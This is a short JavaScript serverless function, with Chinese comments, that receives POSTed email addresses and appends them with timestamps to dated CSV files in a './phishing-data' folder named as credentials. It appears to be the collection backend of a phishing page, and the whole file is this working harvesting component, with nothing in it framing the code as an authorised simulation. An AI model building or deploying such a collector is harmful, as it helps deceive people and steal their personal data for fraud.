const { writeFileSync, existsSync, mkdirSync } = require('fs');

exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    const data = JSON.parse(event.body);
    const email = data.email;
    
    if (!email) {
      return { statusCode: 400, body: 'Email required' };
    }

    // 创建存储目录（如果不存在）
    const dir = './phishing-data';
    if (!existsSync(dir)) mkdirSync(dir);
    
    // 追加记录到CSV文件
    const timestamp = new Date().toISOString();
    const record = `${timestamp},${email}\n`;
    writeFileSync(`${dir}/credentials-${new Date().toISOString().split('T')[0]}.csv`, record, { flag: 'a' });
    
    return {
      statusCode: 200,
      body: JSON.stringify({ message: 'Logged successfully' })
    };
  } catch (error) {
    return { statusCode: 500, body: error.toString() };
  }
};
